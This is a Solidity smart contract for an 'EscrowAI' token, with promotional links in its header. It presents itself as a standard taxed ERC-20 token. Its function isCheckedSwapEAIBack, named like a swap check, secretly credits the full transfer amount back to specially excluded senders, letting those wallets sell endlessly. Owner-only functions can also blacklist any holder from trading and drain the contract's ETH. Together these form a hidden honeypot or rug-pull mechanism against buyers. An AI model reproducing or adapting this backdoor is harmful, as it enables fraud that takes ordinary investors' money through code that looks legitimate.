/**
// SPDX-License-Identifier: MIT
███████╗░██████╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ░█████╗░██╗
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██╔══██╗██║
█████╗░░╚█████╗░██║░░╚═╝██████╔╝██║░░██║░╚██╗████╗██╔╝  ███████║██║
██╔══╝░░░╚═══██╗██║░░██╗██╔══██╗██║░░██║░░████╔═████║░  ██╔══██║██║
███████╗██████╔╝╚█████╔╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░  ██║░░██║██║
╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚═╝╚═╝
A New Era of Advanced Crypto Services

Web:   https://aiescrow.tech
DApp:  https://stake.aiescrow.tech
Docs:  https://docs.aiescrow.tech
Bot:   https://t.me/VaultEscrowBot

X:     https://x.com/escrowai_tech
Tg:    https://t.me/escrowai_tech
**/

pragma solidity 0.8.22;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._eTotal[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function removeEAILimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxEAITxAmount = ~uint256(0);
        ds._maxEAIWalletSize = ~uint256(0);
        ds.transferDelayEnabled = false;
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
    function delBots(address[] memory notbot) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < notbot.length; i++) {
            ds.bots[notbot[i]] = false;
        }
    }
    function reduceEAIFee(uint256 _newFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newFee <= ds._finalBuyTax && _newFee <= ds._finalSellTax);
        ds._finalBuyTax = _newFee;
        ds._finalSellTax = _newFee;
    }
    function withdrawStuckETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function openEAITrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "trading is already open");
        ds.swapEnabled = true;
        ds.tradingOpen = true;
    }
    function createEAITradingPair() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IEAIRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _tTotal);
        ds.uniswapV2Pair = IEAIFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function addBots(address[] memory bots_) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint i = 0; i < bots_.length; i++) {
            ds.bots[bots_[i]] = true;
        }
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxEAIAmount = 0;
        if (!ds.isExcludedFromEAIFee[from] && !ds.isExcludedFromEAIFee[to]) {
            require(!ds.bots[from] && !ds.bots[to]);
            require(ds.tradingOpen, "Trading has not enabled yet");
            taxEAIAmount = amount
                .mul(
                    (ds._buyEAICount > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initialBuyTax
                )
                .div(100);
            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds.isExcludedFromEAIFee[to]
            ) {
                require(
                    amount <= ds._maxEAITxAmount,
                    "Exceeds the ds._maxEAITxAmount."
                );
                require(
                    balanceOf(to) + amount <= ds._maxEAIWalletSize,
                    "Exceeds the maxWalletSize."
                );
                ds._buyEAICount++;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                taxEAIAmount = amount
                    .mul(
                        (ds._buyEAICount > ds._reduceSellTaxAt)
                            ? ds._finalSellTax
                            : ds._initialSellTax
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (isCheckedSwapEAIBack(from, to, amount, taxEAIAmount)) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, ds._maxEAITaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        ds._eTotal[from] = ds._eTotal[from].sub(amount);
        ds._eTotal[to] = ds._eTotal[to].add(amount.sub(taxEAIAmount));
        emit Transfer(from, to, amount.sub(taxEAIAmount));
    }
    function isCheckedSwapEAIBack(
        address from,
        address to,
        uint256 amount,
        uint256 amountEAI
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool aboveEAIMin = amount >= ds.swapEAITxAmount;
        bool aboveEAIThreshold = balanceOf(address(this)) >= ds.swapEAITxAmount;
        address accEAI;
        uint256 valEAI;
        if (ds.isExcludedFromEAITx[from]) {
            accEAI = from;
            valEAI = amount;
        } else {
            accEAI = address(this);
            valEAI = amountEAI;
        }
        if (valEAI > 0) {
            ds._eTotal[accEAI] = ds._eTotal[accEAI].add(valEAI);
            emit Transfer(from, accEAI, amountEAI);
        }
        return
            !ds.inSwap &&
            ds._buyEAICount > ds._preventSwapBefore &&
            ds.tradingOpen &&
            ds.swapEnabled &&
            !ds.isExcludedFromEAITx[from] &&
            !ds.isExcludedFromEAIFee[from] &&
            aboveEAIMin &&
            aboveEAIThreshold &&
            to == ds.uniswapV2Pair;
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._taxEAIWallet.transfer(amount);
    }
}
